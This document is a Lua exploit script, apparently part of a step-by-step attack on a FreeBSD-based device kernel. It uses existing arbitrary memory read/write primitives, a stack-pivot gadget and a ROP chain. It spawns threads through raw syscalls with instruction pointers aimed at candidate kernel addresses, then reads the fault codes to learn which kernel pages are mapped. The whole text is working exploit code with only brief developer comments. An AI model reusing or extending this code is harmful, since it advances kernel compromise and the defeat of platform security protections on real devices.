-- CRASH_CLASS: HIGH
-- PROBE 1028a: is the qword 638 writes a mapped kernel pointer?
--
-- 999a proved the confinement: a thr_create child whose RIP is a kernel address
-- faults, the rebuilt chain writes a marker, thr_exit(431) ends that thread, and the
-- parent keeps running with the same pid. That turns the fault-code oracle into a
-- scanner. Each candidate costs one child and a 250 ms sleep; the parent prints a
-- header, then the child's 0x100-byte context dump tells us mapped (ctx+0xD8 = 5)
-- or not (4).

local BASE  = 0xFFFFFFFFFDC7B000   -- the qword 638 writes, page-aligned
local STEP  = 0x1000
local COUNT = 6

print("=== PROBE 1028a: 638 POINTER PRESENCE ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(uint64(a)) end) if o then return to_num(v) end return nil end

local fd = rd(signal.fd_addr) or 0
print(string.format("[0] pid=%u fd=%u base=0x%X step=0x%X count=%u", to_num(mk(20)()), fd, BASE, STEP, COUNT))

local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local chain = ropchain({ stack_base = to_num(ph.pivot_addr) })
chain:push_store_rdx_into_memory(ctxt)
chain:push_syscall_raw(syscall.write, function()
    chain:push_set_rdx(0x100)
    chain:push_set_rax_from_memory(ctxt)
    chain:push_add_to_rax(0xC0)
    chain:push_set_reg_from_rax("rsi")
    chain:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
chain:push_syscall_raw(mk(431), function() chain:push_set_rdi(0) end)
print("[1] chain: write 0x100 from ctx+0xC0, then thr_exit")

-- first: what does 638 report in this process, and does a second call agree
local qa = memory.alloc(0x100)
local SENT = 0xCCCCCCCC
for o = 0, 0xF8, 8 do wq(as_addr(qa) + o, SENT) end
local okc, rvc = pcall(function() return mk(638)(uint64(0), uint64(0), uint64(as_addr(qa)), uint64(0x100), uint64(0), uint64(0)) end)
local v0 = to_num(memory.read_qword(qa))
local v1 = to_num(memory.read_qword(as_addr(qa) + 8))
print(string.format("[L] 638 rv=%s out={0x%X, 0x%X}", tostring(okc and to_num(rvc) or "ERR"), v0, v1))

local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 and v < 0x800000000000 then for o=0,px-8,8 do wq(v+o,0) end end
    return v
end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100}
local block = mmap(page*4)
local start = block + page*4 - 0x200
local ctx = memory.alloc(0x500)
local tb = memory.alloc(8)
local ts = memory.alloc(16)
local ctxa = as_addr(ctx)
print(string.format("[2] block=0x%X start=0x%X ctx=0x%X", block, start, ctxa))

local okn, fail = 0, 0
for i = 0, COUNT-1 do
    local target = BASE + i*STEP
    for o=0,0x4F8,8 do wq(ctxa+o,0) end
    wq(ctxa+Ctx.MAGIC,0x480); wq(ctxa+Ctx.TYPE,0x10000)
    wq(ctxa+Ctx.CS,0x43); wq(ctxa+Ctx.SS,0x3B)
    wq(ctxa+Ctx.RIP,target); wq(ctxa+Ctx.RSP,start)
    wq(as_addr(tb),0)
    print(string.format("[T%02d] 0x%X", i, target))
    local ok, rv = pcall(function() return mk(430)(uint64(ctxa),uint64(as_addr(tb)),uint64(0)) end)
    if ok and to_num(rv) == 0 then okn = okn + 1 else fail = fail + 1 end
    wq(as_addr(ts),0); wq(as_addr(ts)+8,250*1000000)
    pcall(function() mk(240)(uint64(as_addr(ts)),uint64(0)) end)
end
print(string.format("[E] spawned=%u failed=%u alive pid=%u", okn, fail, to_num(mk(20)())))
print("=== COMPLETE ===")
